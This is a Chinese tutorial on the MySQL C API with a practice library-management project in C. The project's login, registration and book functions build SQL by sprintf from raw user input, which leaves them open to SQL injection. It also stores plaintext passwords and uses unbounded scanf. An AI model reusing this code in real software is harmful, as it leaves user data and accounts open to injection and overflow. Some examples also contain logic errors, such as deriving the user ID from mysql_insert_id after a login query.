返回值
:
返回一个 C 字符串，包含错误信息。
示例
:
fprintf(stderr, "Error: %s\n", mysql_error(conn));
完整示例
#include &lt;mysql/mysql.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
int main() {
MYSQL *conn;
MYSQL_RES *res;
MYSQL_ROW row;
// 初始化 MySQL 连接
conn = mysql_init(NULL);
if (conn == NULL) {
fprintf(stderr, "mysql_init() failed\n");
exit(EXIT_FAILURE);
}
// 连接到数据库
if (mysql_real_connect(conn, "localhost", "user", "password", "testdb", 0, NULL, 0) == NULL) {
fprintf(stderr, "mysql_real_connect() failed\n");
mysql_close(conn);
exit(EXIT_FAILURE);
}
// 执行 SQL 查询
if (mysql_query(conn, "SELECT id, name FROM test")) {
fprintf(stderr, "SELECT failed. Error: %s\n", mysql_error(conn));
mysql_close(conn);
exit(EXIT_FAILURE);
}
// 获取结果集
res = mysql_store_result(conn);
if (res == NULL) {
fprintf(stderr, "mysql_store_result() failed. Error: %s\n", mysql_error(conn));
mysql_close(conn);
exit(EXIT_FAILURE);
}
// 输出查询结果
int num_fields = mysql_num_fields(res);
while ((row = mysql_fetch_row(res))) {
for(int i = 0; i &lt; num_fields; i++) {
printf("%s ", row[i] ? row[i] : "NULL");
}
printf("\n");
}
// 释放结果集
mysql_free_result(res);
// 关闭 MySQL 连接
mysql_close(conn);
exit(EXIT_SUCCESS);
}
其他常用 API 函数
mysql_affected_rows
: 获取查询影响的行数。
mysql_num_fields
: 获取结果集中字段的数量。
mysql_field_count
: 获取查询的字段数。
mysql_insert_id
: 获取插入操作后生成的自增 ID。
7.
事务处理
MySQL 支持事务，可以使用
mysql_autocommit
、
mysql_commit
和
mysql_rollback
来手动管理事务。
自动提交模式
int mysql_autocommit(MYSQL *mysql, my_bool mode);
参数
:
mysql
: 已连接的 MYSQL 结构体指针。
mode
: 设置是否自动提交，
1
为启用自动提交，
0
为关闭自动提交。
返回值
:
成功返回 0，失败返回非 0 值。
示例
:
mysql_autocommit(conn, 0);  // 关闭自动提交
提交事务
int mysql_commit(MYSQL *mysql);
参数
:
mysql
: 已连接的 MYSQL 结构体指针。
返回值
:
成功返回 0，失败返回非 0 值。
示例
:
if (mysql_commit(conn)) {
fprintf(stderr, "Commit failed. Error: %s\n", mysql_error(conn));
}
回滚事务
int mysql_rollback(MYSQL *mysql);
参数
:
mysql
: 已连接的 MYSQL 结构体指针。
返回值
:
成功返回 0，失败返回非 0 值。
示例
:
if (mysql_rollback(conn)) {
fprintf(stderr, "Rollback failed. Error: %s\n", mysql_error(conn));
}
8.
预处理语句 (Prepared Statements)
预处理语句用于执行重复的 SQL 语句或提高安全性，避免 SQL 注入。主要函数有
mysql_stmt_init
、
mysql_stmt_prepare
、
mysql_stmt_execute
等。
初始化预处理语句
MYSQL_STMT *mysql_stmt_init(MYSQL *mysql);
参数
:
mysql
: 已连接的 MYSQL 结构体指针。
返回值
:
成功返回
MYSQL_STMT
结构体指针，失败返回
NULL
。
准备 SQL 语句
int mysql_stmt_prepare(MYSQL_STMT *stmt, const char *query, unsigned long length);
参数
:
stmt
:
mysql_stmt_init
返回的预处理语句结构体指针。
query
: SQL 查询语句。
length
: SQL 查询语句的长度。
返回值
:
成功返回 0，失败返回非 0 值。
执行预处理语句
int mysql_stmt_execute(MYSQL_STMT *stmt);
参数
:
stmt
: 已准备的预处理语句结构体指针。
返回值
:
成功返回 0，失败返回非 0 值。
示例
:
MYSQL_STMT *stmt;
stmt = mysql_stmt_init(conn);
if (!stmt) {
fprintf(stderr, "mysql_stmt_init() failed\n");
}
const char *query = "INSERT INTO test (id, name) VALUES (?, ?)";
if (mysql_stmt_prepare(stmt, query, strlen(query))) {
fprintf(stderr, "mysql_stmt_prepare() failed. Error: %s\n", mysql_error(conn));
}
// 设置参数并执行预处理语句（略）
if (mysql_stmt_execute(stmt)) {
fprintf(stderr, "mysql_stmt_execute() failed. Error: %s\n", mysql_error(conn));
}
mysql_stmt_close(stmt);
9.
获取结果字段的元数据
使用
mysql_fetch_fields
可以获取结果集中各字段的元数据。
MYSQL_FIELD *mysql_fetch_fields(MYSQL_RES *result);
参数
:
result
: 结果集指针。
返回值
:
返回字段数组。
示例
:
MYSQL_RES *result = mysql_store_result(conn);
MYSQL_FIELD *fields = mysql_fetch_fields(result);
for (int i = 0; i &lt; mysql_num_fields(result); i++) {
printf("Field %d: %s\n", i, fields[i].name);
}
10.
大数据集处理
使用
mysql_use_result
可以处理大数据集，避免一次性将所有数据加载到内存中。
MYSQL_RES *mysql_use_result(MYSQL *mysql);
参数
:
mysql
: 连接的 MYSQL 结构体指针。
返回值
:
成功返回结果集指针，失败返回
NULL
。
示例
:
MYSQL_RES *result = mysql_use_result(conn);
MYSQL_ROW row;
while ((row = mysql_fetch_row(result))) {
// 处理每一行数据
}
mysql_free_result(result);
11.
多线程支持
MySQL C API 是线程安全的，但在多线程环境下，需要使用以下两个函数：
初始化多线程环境
int mysql_thread_init(void);
结束多线程环境
void mysql_thread_end(void);
在多线程程序开始时，调用
mysql_thread_init
，在结束时调用
mysql_thread_end
，确保多线程环境的正确使用。
12.
字符集操作
MySQL 提供了一些函数来处理字符集，确保数据库与应用程序之间的数据正确编码。
设置客户端字符集
int mysql_set_character_set(MYSQL *mysql, const char *csname);
参数
:
mysql
: 连接的 MYSQL 结构体指针。
csname
: 字符集名称（如 "utf8"）。
返回值
:
成功返回 0，失败返回非 0 值。
示例
:
if (mysql_set_character_set(conn, "utf8")) {
fprintf(stderr, "Failed to set character set to utf8. Error: %s\n", mysql_error(conn));
}
获取当前客户端字符集
const char *mysql_character_set_name(MYSQL *mysql);
返回值
:
返回当前客户端字符集的名称。
示例
:
printf("Client character set: %s\n", mysql_character_set_name(conn));
13.
错误处理及诊断
MySQL 提供了丰富的错误处理和诊断函数，如
mysql_errno
、
mysql_sqlstate
、
mysql_warning_count
。
获取错误代码
unsigned int mysql_errno(MYSQL *mysql);
获取 SQL 状态码
const char *mysql_sqlstate(MYSQL *mysql);
获取警告数量
unsigned int mysql_warning_count(MYSQL *mysql);
demo：
printf("MySQL Error No: %u\n", mysql_errno(conn));
printf("MySQL SQLState: %s\n", mysql_sqlstate(conn));
printf("MySQL Warning Count: %u\n", mysql_warning_count(conn));
14.
断线重连
MySQL 提供了自动重连功能，通过以下代码可以启用断线重连：
my_bool reconnect = 1;
mysql_options(conn, MYSQL_OPT_RECONNECT, &amp;reconnect);
15.
关闭 MySQL 连接
别忘了每次操作结束后关闭连接：
mysql_close(conn);
16.
预处理语句 (Prepared Statements) 高级操作
预处理语句 (
MYSQL_STMT
) 是处理动态查询、重复执行 SQL 操作和防止 SQL 注入的重要机制。通过预处理语句，可以提高性能并增强 SQL 的安全性。
初始化预处理语句
MYSQL_STMT *mysql_stmt_init(MYSQL *mysql);
参数
:
stmt
: 初始化的
MYSQL_STMT
结构体指针。
query
: SQL 查询语句。
length
: SQL 查询语句的长度（以字节为单位）。
返回值
:
成功返回 0，失败返回非 0 值。
绑定参数
在执行预处理语句前，必须将参数绑定到 SQL 语句中。使用
mysql_stmt_bind_param
来绑定参数。
int mysql_stmt_bind_param(MYSQL_STMT *stmt, MYSQL_BIND *bind);
参数
:
stmt
: 预处理语句的结构体指针。
bind
: 指向包含要绑定参数的
MYSQL_BIND
结构体数组。
返回值
:
成功返回 0，失败返回非 0 值。
MYSQL_BIND 结构体
MYSQL_BIND
用于定义输入或输出参数。其成员包括：
buffer
: 指向数据的指针。
buffer_type
: 参数的数据类型，如
MYSQL_TYPE_LONG
、
MYSQL_TYPE_STRING
。
is_null
: 指向标识参数是否为
NULL
的指针。
length
: 指向保存数据长度的指针。
示例：绑定参数
MYSQL_STMT *stmt;
MYSQL_BIND bind[2];
int id;
char name[20];
stmt = mysql_stmt_init(conn);
const char *query = "INSERT INTO test (id, name) VALUES (?, ?)";
mysql_stmt_prepare(stmt, query, strlen(query));
memset(bind, 0, sizeof(bind));
// 绑定 ID 参数
bind[0].buffer_type = MYSQL_TYPE_LONG;
bind[0].buffer = (char *)&amp;id;
// 绑定 Name 参数
bind[1].buffer_type = MYSQL_TYPE_STRING;
bind[1].buffer = name;
bind[1].buffer_length = sizeof(name);
// 绑定参数
mysql_stmt_bind_param(stmt, bind);
// 设置参数值
id = 1;
strcpy(name, "Alice");
// 执行预处理语句
mysql_stmt_execute(stmt);
mysql_stmt_close(stmt);
执行预处理语句
int mysql_stmt_execute(MYSQL_STMT *stmt);
参数
:
stmt
: 已准备的预处理语句结构体指针。
返回值
:
成功返回 0，失败返回非 0 值。
绑定结果
查询预处理语句需要绑定结果变量到
MYSQL_BIND
结构体中。
int mysql_stmt_bind_result(MYSQL_STMT *stmt, MYSQL_BIND *bind);
参数
:
stmt
: 预处理语句的结构体指针。
bind
: 指向包含结果数据的
MYSQL_BIND
结构体数组。
返回值
:
成功返回 0，失败返回非 0 值。
示例：绑定查询结果
MYSQL_STMT *stmt;
MYSQL_BIND bind[2];
int id;
char name[20];
stmt = mysql_stmt_init(conn);
const char *query = "SELECT id, name FROM test WHERE id = ?";
mysql_stmt_prepare(stmt, query, strlen(query));
// 绑定参数
MYSQL_BIND param[1];
memset(param, 0, sizeof(param));
param[0].buffer_type = MYSQL_TYPE_LONG;
param[0].buffer = (char *)&amp;id;
mysql_stmt_bind_param(stmt, param);
id = 1;
mysql_stmt_execute(stmt);
// 绑定结果
memset(bind, 0, sizeof(bind));
bind[0].buffer_type = MYSQL_TYPE_LONG;
bind[0].buffer = (char *)&amp;id;
bind[1].buffer_type = MYSQL_TYPE_STRING;
bind[1].buffer = name;
bind[1].buffer_length = sizeof(name);
mysql_stmt_bind_result(stmt, bind);
// 获取结果
while (mysql_stmt_fetch(stmt) == 0) {
printf("ID: %d, Name: %s\n", id, name);
}
mysql_stmt_close(stmt);
获取结果行
int mysql_stmt_fetch(MYSQL_STMT *stmt);
参数
:
stmt
: 预处理语句的结构体指针。
返回值
:
0
：成功获取一行结果。
MYSQL_NO_DATA
：没有更多数据。
其他非零值：发生错误。
释放预处理语句
int mysql_stmt_close(MYSQL_STMT *stmt);
参数
:
stmt
: 预处理语句的结构体指针。
返回值
:
成功返回 0，失败返回非 0 值。
17.
获取预处理语句的元数据
可以通过
mysql_stmt_param_metadata
和
mysql_stmt_result_metadata
函数获取预处理语句的参数和结果元数据。
获取参数元数据
MYSQL_RES *mysql_stmt_param_metadata(MYSQL_STMT *stmt);
参数
:
stmt
: 预处理语句的结构体指针。
返回值
:
返回结果集，包含预处理语句参数的元数据。
获取结果元数据
MYSQL_RES *mysql_stmt_result_metadata(MYSQL_STMT *stmt);
参数
:
stmt
: 预处理语句的结构体指针。
返回值
:
返回结果集，包含预处理语句结果集的元数据。
示例
:
MYSQL_RES *result_metadata = mysql_stmt_result_metadata(stmt);
if (result_metadata) {
int num_fields = mysql_num_fields(result_metadata);
printf("Number of result fields: %d\n", num_fields);
mysql_free_result(result_metadata);
}
18.
事务和预处理语句的结合
通过预处理语句和事务的结合，可以确保多条 SQL 语句要么全部成功，要么全部失败。
示例：事务与预处理语句结合
mysql_autocommit(conn, 0);  // 关闭自动提交
MYSQL_STMT *stmt = mysql_stmt_init(conn);
const char *query = "INSERT INTO test (id, name) VALUES (?, ?)";
mysql_stmt_prepare(stmt, query, strlen(query));
MYSQL_BIND bind[2];
int id = 1;
char name[20] = "Alice";
// 绑定参数
memset(bind, 0, sizeof(bind));
bind[0].buffer_type = MYSQL_TYPE_LONG;
bind[0].buffer = (char *)&amp;id;
bind[1].buffer_type = MYSQL_TYPE_STRING;
bind[1].buffer = name;
bind[1].buffer_length = sizeof(name);
mysql_stmt_bind_param(stmt, bind);
if (mysql_stmt_execute(stmt)) {
mysql_rollback(conn);  // 执行失败，回滚
} else {
mysql_commit(conn);    // 执行成功，提交事务
}
mysql_stmt_close(stmt);
mysql_autocommit(conn, 1);  // 恢复自动提交
19.
批量插入
使用
mysql_stmt_execute
可以进行批量插入，通过修改绑定的数据，反复执行
mysql_stmt_execute
。
示例
:
MYSQL_STMT *stmt;
stmt = mysql_stmt_init(conn);
const char *query = "INSERT INTO test (id, name) VALUES (?, ?)";
mysql_stmt_prepare(stmt, query, strlen(query));
MYSQL_BIND bind[2];
int id;
char name[20];
memset(bind, 0, sizeof(bind));
// 绑定参数
bind[0].buffer_type = MYSQL_TYPE_LONG;
bind[0].buffer = (char *)&amp;id;
bind[1].buffer_type = MYSQL_TYPE_STRING;
bind[1].buffer = name;
bind[1].buffer_length = sizeof(name);
mysql_stmt_bind_param(stmt, bind);
// 批量插入数据
for (int i = 1; i &lt;= 10; i++) {
id = i;
sprintf(name, "Name%d", i);
mysql_stmt_execute(stmt);
}
mysql_stmt_close(stmt);
20.
存储过程
MySQL 支持通过预处理语句调用存储过程。
const char *query = "CALL procedure_name(?, ?)";
mysql_stmt_prepare(stmt, query, strlen(query));
通过绑定参数和执行来调用存储过程，和普通预处理语句非常类似。
21.
多结果集处理 (Multiple Result Sets)
在某些情况下（例如存储过程或执行多个查询），MySQL 返回多个结果集。MySQL C API 提供了一些函数来处理这些结果集。
检测是否有更多的结果集
int mysql_more_results(MYSQL *mysql);
参数
:
mysql
: 已连接的
MYSQL
结构体指针。
返回值
:
如果有更多的结果集返回非 0 值，否则返回 0。
移动到下一个结果集
int mysql_next_result(MYSQL *mysql);
参数
:
mysql
: 已连接的
MYSQL
结构体指针。
返回值
:
成功返回 0，出错返回非 0 值。
示例：处理多结果集
if (mysql_query(conn, "CALL my_procedure();")) {
fprintf(stderr, "Query failed: %s\n", mysql_error(conn));
}
do {
MYSQL_RES *result = mysql_store_result(conn);
if (result) {
// 处理当前结果集
MYSQL_ROW row;
while ((row = mysql_fetch_row(result))) {
printf("Row: %s\n", row[0]);
}
mysql_free_result(result);
}
} while (mysql_more_results(conn) &amp;&amp; mysql_next_result(conn) == 0);
22.
多查询执行 (Multiple Queries)
MySQL 支持一次性执行多条 SQL 语句。通过
mysql_query
或
mysql_real_query
执行包含多条 SQL 语句的查询，结果集可使用
mysql_store_result
获取。
int mysql_query(MYSQL *mysql, const char *query);
int mysql_real_query(MYSQL *mysql, const char *query, unsigned long length);
参数
:
query
: 包含多条 SQL 语句的字符串。
返回值
:
成功返回 0，失败返回非 0 值。
示例：多查询执行
const char *query = "SELECT * FROM table1; SELECT * FROM table2;";
if (mysql_query(conn, query)) {
fprintf(stderr, "Query failed: %s\n", mysql_error(conn));
}
do {
MYSQL_RES *result = mysql_store_result(conn);
if (result) {
MYSQL_ROW row;
while ((row = mysql_fetch_row(result))) {
printf("Row: %s\n", row[0]);
}
mysql_free_result(result);
}
} while (mysql_more_results(conn) &amp;&amp; mysql_next_result(conn) == 0);
23.
大数据操作
对于非常大的数据集，可以使用流式读取或写入以避免内存不足。
mysql_use_result
允许逐行处理结果集，而不是将整个结果集载入内存。
逐行获取大数据集
MYSQL_RES *mysql_use_result(MYSQL *mysql);
返回值
:
返回结果集指针，用于流式读取。
示例：逐行读取结果
MYSQL_RES *result = mysql_use_result(conn);
MYSQL_ROW row;
while ((row = mysql_fetch_row(result))) {
printf("Row: %s\n", row[0]);
}
mysql_free_result(result);
24.
异步查询
MySQL C API 的传统函数都是同步的。对于某些场景，异步查询可以提高性能。虽然原生 C API 不提供完全异步的查询接口，但可以通过分离连接的线程执行来实现异步操作。也可以使用
mysql_poll
来检查某些非阻塞操作的状态。
示例：异步查询模型
通常通过创建新线程执行查询，然后主线程处理其他任务，最终等待查询完成。
void *run_query(void *arg) {
MYSQL *conn = (MYSQL *)arg;
mysql_query(conn, "SELECT * FROM test");
// 处理查询结果
return NULL;
}
int main() {
MYSQL *conn = mysql_init(NULL);
mysql_real_connect(conn, "host", "user", "password", "database", 0, NULL, 0);
pthread_t thread;
pthread_create(&amp;thread, NULL, run_query, conn);
// 主线程可以处理其他任务
// ...
pthread_join(thread, NULL);
mysql_close(conn);
return 0;
}
25.
SSL 安全连接
MySQL C API 支持 SSL 加密连接，通过
mysql_ssl_set
函数可以配置 SSL 相关的参数。
设置 SSL 连接
int mysql_ssl_set(MYSQL *mysql,
const char *key,
const char *cert,
const char *ca,
const char *capath,
const char *cipher);
参数
:
key
: 客户端私钥文件。
cert
: 客户端证书文件。
ca
: 受信任的 CA 文件。
capath
: 受信任的 CA 文件路径。
cipher
: SSL 加密算法。
示例
:
MYSQL *conn = mysql_init(NULL);
mysql_ssl_set(conn, "client-key.pem", "client-cert.pem", "ca-cert.pem", NULL, NULL);
mysql_real_connect(conn, "host", "user", "password", "database", 0, NULL, CLIENT_SSL);
26.
存储过程的输出参数处理
当调用存储过程并处理输出参数时，需使用预处理语句并绑定输出参数到结果集中。与普通预处理语句不同，输出参数需要绑定为
MYSQL_BIND
的
is_null
和
length
字段。
示例：存储过程输出参数
MYSQL_STMT *stmt = mysql_stmt_init(conn);
const char *query = "CALL my_procedure(?, ?, ?)";
mysql_stmt_prepare(stmt, query, strlen(query));
MYSQL_BIND bind[3];
memset(bind, 0, sizeof(bind));
// 绑定输入参数
int input = 5;
bind[0].buffer_type = MYSQL_TYPE_LONG;
bind[0].buffer = (char *)&amp;input;
// 绑定输出参数
int output;
unsigned long length;
my_bool is_null;
bind[1].buffer_type = MYSQL_TYPE_LONG;
bind[1].buffer = (char *)&amp;output;
bind[1].length = &amp;length;
bind[1].is_null = &amp;is_null;
mysql_stmt_bind_param(stmt, bind);
mysql_stmt_execute(stmt);
// 获取输出参数
mysql_stmt_fetch(stmt);
printf("Output: %d\n", output);
mysql_stmt_close(stmt);
27.
自定义错误处理和诊断
除了通过
mysql_error
获取错误信息，还可以使用
mysql_errno
和
mysql_sqlstate
进一步诊断错误。
​​​​​​​
28.
自定义连接超时和重试机制
可以使用
mysql_options
设置连接超时、重试次数等高级选项。
设置连接超时
int timeout = 10;  // 设置超时时间为 10 秒
mysql_options(conn, MYSQL_OPT_CONNECT_TIMEOUT, &amp;timeout);
自动重连
my_bool reconnect = 1;
mysql_options(conn, MYSQL_OPT_RECONNECT, &amp;reconnect);
练习项目：图书馆管理系统
项目设计：图书馆管理系统
项目简介：
我们将实现一个
图书馆管理系统
，通过控制台界面与用户交互，支持对用户、图书、借阅信息的全面管理。系统还会包括一些高级功能，比如：
用户角色权限管理（管理员和普通用户）
预定与借阅图书的操作
图书库存检查与批量入库
日志记录（操作记录）
数据持久化（本地数据库）
功能需求：
用户管理
注册用户，分为管理员和普通用户，管理员具有更多权限。
图书管理
添加图书、编辑图书信息、删除图书。
借阅与归还
用户可以借阅或归还图书，管理员可以查看借阅记录。
图书预定
如果图书已被借出，用户可以预定，待图书归还后自动通知。
库存管理
管理员可以查看库存不足的图书，进行批量入库操作。
日志管理
系统记录所有操作日志，供管理员查看。
数据库设计：
CREATE DATABASE library_management;
USE library_management;
CREATE TABLE users (
id INT AUTO_INCREMENT PRIMARY KEY,
username VARCHAR(50) NOT NULL,
password VARCHAR(100) NOT NULL,
role ENUM('admin', 'user') NOT NULL
);
CREATE TABLE books (
id INT AUTO_INCREMENT PRIMARY KEY,
title VARCHAR(100) NOT NULL,
author VARCHAR(100),
stock INT DEFAULT 0
);
CREATE TABLE borrow_records (
id INT AUTO_INCREMENT PRIMARY KEY,
user_id INT,
book_id INT,
borrow_date DATE,
return_date DATE,
status ENUM('borrowed', 'returned') DEFAULT 'borrowed',
FOREIGN KEY (user_id) REFERENCES users(id),
FOREIGN KEY (book_id) REFERENCES books(id)
);
CREATE TABLE reservations (
id INT AUTO_INCREMENT PRIMARY KEY,
user_id INT,
book_id INT,
reservation_date DATE,
FOREIGN KEY (user_id) REFERENCES users(id),
FOREIGN KEY (book_id) REFERENCES books(id)
);
项目结构：
library_management/
│
├── include/
│   ├── database.h      # 数据库操作头文件
│   ├── user.h          # 用户管理头文件
│   ├── book.h          # 图书管理头文件
│   ├── borrow.h        # 借阅管理头文件
│   ├── reservation.h   # 预定管理头文件
├── src/
│   ├── database.c      # 数据库操作实现
│   ├── user.c          # 用户管理实现
│   ├── book.c          # 图书管理实现
│   ├── borrow.c        # 借阅管理实现
│   ├── reservation.c   # 预定管理实现
│   ├── main.c          # 主程序入口
├── Makefile            # 编译工程的 Makefile（在Windows环境下可以使用MinGW或Visual Studio）
└── README.md           # 项目说明文档
技术栈：
开发语言
：C/C++
数据库
：MySQL（Windows 下可以安装 MySQL Server）
开发环境
：Visual Studio 或 MinGW (GCC)，支持 C/C++ 开发
Windows 专有库
：可选使用 WinAPI 实现图形界面或控制台输出的美化
第一步：设置 Windows 开发环境
1. MySQL 在 Windows 上的安装与配置
下载并安装 MySQL，安装 MySQL Server 和 MySQL C API 客户端库。
配置数据库，确保 MySQL 服务正常运行，并设置好用户权限。
2. 安装开发工具
Visual Studio
：可以直接安装 C/C++ 开发环境，集成调试、编译、运行功能。
MinGW
：如果更喜欢命令行，可以安装 MinGW，它可以在 Windows 上提供类似 Linux 的 GCC 编译环境。
第二步：数据库操作模块
我们首先编写数据库模块来支持与 MySQL 数据库的交互。由于在 Windows 下开发，可以利用 MySQL 提供的 C API 函数，与 MySQL 进行连接、执行 SQL 语句、获取查询结果等。
include/database.h
#ifndef DATABASE_H
#define DATABASE_H
#include &lt;mysql/mysql.h&gt;
// 初始化数据库连接
MYSQL* init_db();
// 关闭数据库连接
void close_db(MYSQL *conn);
// 执行查询并返回结果
MYSQL_RES* execute_query(MYSQL *conn, const char *query);
// 执行更新或插入操作
int execute_update(MYSQL *conn, const char *query);
#endif
src/database.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;mysql/mysql.h&gt;
#include "database.h"
// 初始化数据库连接
MYSQL* init_db() {
MYSQL *conn = mysql_init(NULL);
if (conn == NULL) {
fprintf(stderr, "mysql_init() failed\n");
return NULL;
}
if (mysql_real_connect(conn, "localhost", "root", "password", "library_management", 0, NULL, 0) == NULL) {
fprintf(stderr, "mysql_real_connect() failed: %s\n", mysql_error(conn));
mysql_close(conn);
return NULL;
}
return conn;
}
// 关闭数据库连接
void close_db(MYSQL *conn) {
mysql_close(conn);
}
// 执行查询并返回结果
MYSQL_RES* execute_query(MYSQL *conn, const char *query) {
if (mysql_query(conn, query)) {
fprintf(stderr, "Query failed: %s\n", mysql_error(conn));
return NULL;
}
return mysql_store_result(conn);
}
// 执行更新或插入操作
int execute_update(MYSQL *conn, const char *query) {
if (mysql_query(conn, query)) {
fprintf(stderr, "Update failed: %s\n", mysql_error(conn));
return 0;
}
return 1;
}
第三步：用户管理模块
include/user.h
#ifndef USER_H
#define USER_H
#include &lt;mysql/mysql.h&gt;
// 用户登录
int user_login(MYSQL *conn, const char *username, const char *password);
// 用户注册
int user_register(MYSQL *conn, const char *username, const char *password, const char *role);
// 获取用户角色
char* get_user_role(MYSQL *conn, const char *username);
#endif
src/user.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include "database.h"
#include "user.h"
// 用户登录
int user_login(MYSQL *conn, const char *username, const char *password) {
char query[256];
sprintf(query, "SELECT * FROM users WHERE username = '%s' AND password = '%s'", username, password);
MYSQL_RES *res = execute_query(conn, query);
if (mysql_num_rows(res) &gt; 0) {
mysql_free_result(res);
return 1;
}
mysql_free_result(res);
return 0;
}
// 用户注册
int user_register(MYSQL *conn, const char *username, const char *password, const char *role) {
char query[256];
sprintf(query, "INSERT INTO users (username, password, role) VALUES ('%s', '%s', '%s')", username, password, role);
return execute_update(conn, query);
}
// 获取用户角色
char* get_user_role(MYSQL *conn, const char *username) {
char query[256];
sprintf(query, "SELECT role FROM users WHERE username = '%s'", username);
MYSQL_RES *res = execute_query(conn, query);
MYSQL_ROW row = mysql_fetch_row(res);
char *role = strdup(row[0]);
mysql_free_result(res);
return role;
}
第四步：图书管理模块
include/book.h
#ifndef BOOK_H
#define BOOK_H
#include &lt;mysql/mysql.h&gt;
// 添加图书
int add_book(MYSQL *conn, const char *title, const char *author, int stock);
// 获取所有图书
MYSQL_RES* get_all_books(MYSQL *conn);
// 根据书籍 ID 获取图书信息
MYSQL_RES* get_book_by_id(MYSQL *conn, int id);
// 修改图书信息
int update_book(MYSQL *conn, int id, const char *title, const char *author, int stock);
// 删除图书
int delete_book(MYSQL *conn, int id);
#endif
src/book.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include "database.h"
#include "book.h"
// 添加图书
int add_book(MYSQL *conn, const char *title, const char *author, int stock) {
char query[256];
sprintf(query, "INSERT INTO books (title, author, stock) VALUES ('%s', '%s', %d)", title, author, stock);
return execute_update(conn, query);
}
// 获取所有图书
MYSQL_RES* get_all_books(MYSQL *conn) {
const char *query = "SELECT * FROM books";
return execute_query(conn, query);
}
// 根据书籍 ID 获取图书信息
MYSQL_RES* get_book_by_id(MYSQL *conn, int id) {
char query[100];
sprintf(query, "SELECT * FROM books WHERE id = %d", id);
return execute_query(conn, query);
}
// 修改图书信息
int update_book(MYSQL *conn, int id, const char *title, const char *author, int stock) {
char query[256];
sprintf(query, "UPDATE books SET title = '%s', author = '%s', stock = %d WHERE id = %d", title, author, stock, id);
return execute_update(conn, query);
}
// 删除图书
int delete_book(MYSQL *conn, int id) {
char query[100];
sprintf(query, "DELETE FROM books WHERE id = %d", id);
return execute_update(conn, query);
}
借阅管理模块
include/borrow.h
#ifndef BORROW_H
#define BORROW_H
#include &lt;mysql/mysql.h&gt;
// 借阅图书
int borrow_book(MYSQL *conn, int user_id, int book_id);
// 归还图书
int return_book(MYSQL *conn, int user_id, int book_id);
// 获取用户的借阅记录
MYSQL_RES* get_borrow_records(MYSQL *conn, int user_id);
#endif
src/borrow.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include "database.h"
#include "borrow.h"
// 借阅图书
int borrow_book(MYSQL *conn, int user_id, int book_id) {
char query[256];
sprintf(query, "INSERT INTO borrow_records (user_id, book_id, borrow_date) VALUES (%d, %d, CURDATE())", user_id, book_id);
return execute_update(conn, query);
}
// 归还图书
int return_book(MYSQL *conn, int user_id, int book_id) {
char query[256];
sprintf(query, "UPDATE borrow_records SET return_date = CURDATE(), status = 'returned' WHERE user_id = %d AND book_id = %d AND status = 'borrowed'", user_id, book_id);
return execute_update(conn, query);
}
// 获取用户的借阅记录
MYSQL_RES* get_borrow_records(MYSQL *conn, int user_id) {
char query[256];
sprintf(query, "SELECT * FROM borrow_records WHERE user_id = %d", user_id);
return execute_query(conn, query);
}
预定管理模块
include/reservation.h
#ifndef RESERVATION_H
#define RESERVATION_H
#include &lt;mysql/mysql.h&gt;
// 预定图书
int reserve_book(MYSQL *conn, int user_id, int book_id);
// 获取用户的预定记录
MYSQL_RES* get_reservations(MYSQL *conn, int user_id);
#endif
src/reservation.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include "database.h"
#include "reservation.h"
// 预定图书
int reserve_book(MYSQL *conn, int user_id, int book_id) {
char query[256];
sprintf(query, "INSERT INTO reservations (user_id, book_id, reservation_date) VALUES (%d, %d, CURDATE())", user_id, book_id);
return execute_update(conn, query);
}
// 获取用户的预定记录
MYSQL_RES* get_reservations(MYSQL *conn, int user_id) {
char query[256];
sprintf(query, "SELECT * FROM reservations WHERE user_id = %d", user_id);
return execute_query(conn, query);
}
主程序模块
src/main.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include "database.h"
#include "user.h"
#include "book.h"
#include "borrow.h"
#include "reservation.h"
void show_menu() {
printf("\n*** 图书馆管理系统 ***\n");
printf("1. 用户注册\n");
printf("2. 用户登录\n");
printf("3. 添加图书 (管理员)\n");
printf("4. 查看所有图书\n");
printf("5. 借阅图书\n");
printf("6. 归还图书\n");
printf("7. 预定图书\n");
printf("8. 查看借阅记录\n");
printf("9. 退出\n");
}
int main() {
MYSQL *conn = init_db();
if (conn == NULL) {
return 1;
}
int choice;
char username[50], password[100], role[10];
int user_id;
while (1) {
show_menu();
printf("请选择操作: ");
scanf("%d", &amp;choice);
switch (choice) {
case 1: // 用户注册
printf("输入用户名: ");
scanf("%s", username);
printf("输入密码: ");
scanf("%s", password);
printf("输入角色 (admin/user): ");
scanf("%s", role);
user_register(conn, username, password, role);
break;
case 2: // 用户登录
printf("输入用户名: ");
scanf("%s", username);
printf("输入密码: ");
scanf("%s", password);
if (user_login(conn, username, password)) {
printf("登录成功！\n");
user_id = mysql_insert_id(conn); // 假设这里是用户 ID
} else {
printf("登录失败！\n");
}
break;
case 3: // 添加图书（仅管理员）
// 此处需要判断用户角色，省略
break;
case 4: // 查看所有图书
{
MYSQL_RES *res = get_all_books(conn);
MYSQL_ROW row;
printf("图书列表：\n");
while ((row = mysql_fetch_row(res))) {
printf("ID: %s, 书名: %s, 作者: %s, 库存: %s\n", row[0], row[1], row[2], row[3]);
}
mysql_free_result(res);
break;
}
case 5: // 借阅图书
printf("输入图书 ID: ");
int book_id;
scanf("%d", &amp;book_id);
borrow_book(conn, user_id, book_id);
break;
case 6: // 归还图书
printf("输入图书 ID: ");
scanf("%d", &amp;book_id);
return_book(conn, user_id, book_id);
break;
case 7: // 预定图书
printf("输入图书 ID: ");
scanf("%d", &amp;book_id);
reserve_book(conn, user_id, book_id);
break;
case 8: // 查看借阅记录
{
MYSQL_RES *res = get_borrow_records(conn, user_id);
MYSQL_ROW row;
printf("借阅记录：\n");
while ((row = mysql_fetch_row(res))) {
printf("ID: %s, 图书 ID: %s, 借阅日期: %s, 归还日期: %s, 状态: %s\n", row[0], row[2], row[3], row[4], row[5]);
}
mysql_free_result(res);
break;
}
case 9: // 退出
close_db(conn);
return 0;
default:
printf("无效选项，请重试。\n");
}
}
return 0;
